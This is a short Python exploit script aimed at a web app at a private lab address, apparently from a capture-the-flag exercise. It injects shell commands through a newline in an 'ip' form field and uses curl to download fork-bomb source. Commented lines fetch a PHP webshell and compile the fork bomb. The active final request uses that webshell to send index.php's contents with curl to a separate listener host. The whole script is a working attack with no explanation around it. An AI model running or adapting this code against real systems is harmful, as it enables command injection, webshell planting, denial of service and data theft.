#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

#ip = sys.argv[1]
ip = '192.168.0.100' + ':2222'
url = 'http://{}'.format(ip)

s = requests.Session()

html = s.post(url + '/index.php', data={'ip' : '127.0.0.1\ncurl https://raw.githubusercontent.com/aaronryank/fork-bomb/master/fork-bomb.c --output fork-bomb.c'}, timeout=(None,None)).text
#html = s.post(url + '/index.php', data={'ip' : '127.0.0.1\ncurl https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/cmd.php --output cmd.php'}, timeout=(None,None)).text
#html = s.get(url + '/cmd.php', params={'cmd' : "gcc fork-bomb.c -o fork"}).text
html = s.get(url + '/cmd.php', params={'cmd' : "curl -d \"dir=$(cat index.php)\" http://192.168.0.104:4444"}).text
print(html)


